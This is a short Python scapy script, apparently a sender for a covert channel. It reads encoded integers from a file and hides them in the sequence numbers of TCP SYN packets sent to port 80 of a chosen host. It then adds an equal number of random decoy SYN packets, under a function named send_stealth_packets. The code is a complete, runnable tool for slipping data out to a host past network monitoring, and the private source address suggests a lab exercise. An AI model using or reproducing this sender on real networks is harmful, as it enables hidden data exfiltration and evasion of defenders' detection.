
from scapy.all import *
import time
import random

def send_stealth_packets(dest_ip, sequences):

    for seq in sequences:
        send(IP(src="192.168.253.132", dst=dest_ip, ttl=64)/TCP(
            sport=12345, 
            dport=80,
            seq=seq,
            flags="S"
        ), verbose=0)

    for _ in range(len(sequences)):
        send(IP(src="192.168.253.132", dst=dest_ip, ttl=random.randint(65,128))/TCP(
            sport=random.randint(1024,65535),
            dport=80,
            seq=random.randint(0, 2**32-1),
            flags="S"
        ), verbose=0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 sender.py <dest_ip> <input_file>")
        sys.exit(1)

    dest_ip = sys.argv[1]
    input_file = sys.argv[2]

    try:
        with open(input_file, "r") as f:
            sequences = [int(line.strip()) for line in f]
        send_stealth_packets(dest_ip, sequences)
        print(f"[+] Sent {len(sequences)} data packets with {len(sequences)} noise packets")
    except FileNotFoundError:
        print(f"Error: File {input_file} not found. Run encode.py first.")
    except Exception as e:
        print(f"Error: {str(e)}")